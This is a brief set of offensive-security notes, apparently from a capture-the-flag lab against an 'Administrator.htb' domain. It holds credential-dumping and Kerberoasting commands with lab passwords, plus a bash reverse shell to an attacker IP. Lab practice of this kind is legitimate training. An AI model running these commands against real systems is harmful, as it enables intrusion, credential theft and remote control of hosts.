```bash
nc -nv <target-ip> <target-port>
```
Try pull service banner with ``nc``



"Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"

python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42

impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"

stty raw -echo ; fg

bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'

openssl s_client -showcerts -connect 10.0.10.10:443